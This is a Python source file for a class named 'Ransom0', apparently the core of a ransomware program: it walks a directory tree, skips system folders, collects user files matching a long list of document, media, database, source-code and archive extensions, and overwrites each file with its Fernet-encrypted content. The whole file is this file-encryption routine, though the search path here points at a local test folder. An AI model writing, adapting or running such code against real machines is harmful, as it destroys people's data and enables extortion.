from datetime import datetime
import os
import subprocess
from random import randint

from cryptography.fernet import Fernet



class Ransom0:
    
    username = os.getlogin()
    PATH = os.getcwd()
    
    EXCLUDE_DIRECTORY = (   '/usr', #Mac/Linux system directory
                            '/Library/',
                            '/System',
                            '/Applications',
                            '.Trash',
                            #Windows system directory
                            'Program Files',
                            'Program Files (x86)',
                            'Windows',
                            '$Recycle.Bin',
                            'AppData',
                            'logs',)
    EXTENSIONS = (
        # '.exe,', '.dll', '.so', '.rpm', '.deb', '.vmlinuz', '.img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies

        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
        
        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
        '.java', '.class', '.jar', # java source code
        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
        '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', # linux/mac based scripts
        '.go', '.py', '.pyc', '.bf', '.coffee', # other source code files

        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
    )
    
    def __init__(self,key,digits):
        self.key = key
        self.digits = digits
    
    def clear(self):
        subprocess.call('cls' if os.name == 'nt' else 'clear', shell=False)
        os.system('cls' if os.name == 'nt' else 'clear')
    def FindFiles(self):
        f = open("logs/path.txt", "w")
        cnt = 0
        for root, dirs , files in os.walk("C:/Users/msi/Desktop/test_crypto"): # be careful with this loop
            if any(s in root for s in self.EXCLUDE_DIRECTORY):
                pass
            else:
                for file in files:
                    if file.endswith(self.EXTENSIONS):
                        TARGET = os.path.join(root,file)
                        f.write(TARGET+'\n')
                        print(root)
        
        f.close()
        f = open("logs/cnt.txt","w")
        f.write(str(cnt))
        f.close()
    
    def Encrypt(self, filename):
        f = Fernet(self.key)
        with open(filename,"rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(filename, "wb") as file:
            file.write(encrypted_data)
        print(filename)        
                    
                    
                    


